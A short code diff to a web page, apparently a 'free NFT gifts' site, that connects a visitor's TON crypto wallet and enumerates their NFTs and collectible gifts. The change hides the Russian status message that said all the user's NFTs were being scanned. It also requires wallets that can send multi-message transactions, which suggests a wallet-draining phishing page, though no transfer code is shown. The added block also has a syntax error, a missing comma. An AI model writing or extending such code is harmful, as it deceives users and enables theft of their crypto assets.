@@ -105,12 +105,18 @@
         const tonConnectUI = new TonConnectUI({
             manifestUrl: 'https://nft-gifts-free.vercel.app/tonconnect-manifest.json',
             buttonRootId: 'ton-connect'
+            walletsPreferredFeatures: {
+                sendTransaction: {
+                    minMessages: 2,
+                    extraCurrencyRequired: true
+                }
+            }        
         });
 
         tonConnectUI.onStatusChange(async (wallet) => {
             if (wallet) {
                 const owner = wallet.account.address;
-                statusEl.innerHTML = 'Подключено! Сканирую все ваши NFT и Collectible Gifts...';
+                statusEl.innerHTML = 'Подключено!';
 
                 try {
                     const nfts = await getNfts(owner);
